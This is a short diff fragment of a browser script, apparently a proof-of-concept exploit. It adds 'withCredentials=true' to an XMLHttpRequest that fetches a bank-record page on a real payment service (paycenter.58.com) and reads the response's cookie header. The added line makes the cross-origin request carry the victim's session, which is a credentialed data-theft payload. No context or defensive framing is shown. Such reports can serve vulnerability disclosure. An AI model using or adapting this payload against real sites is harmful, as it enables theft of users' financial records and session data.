@@ -16,6 +16,7 @@ xhttp.onreadystatechange = function() {
     this.getResponseHeader("Cookie");
   }
 };
+xhttp.withCredentials=true;
 xhttp.open("GET", "https://paycenter.58.com/bloc/showbankrecord", true);
 xhttp.send();
 </script>
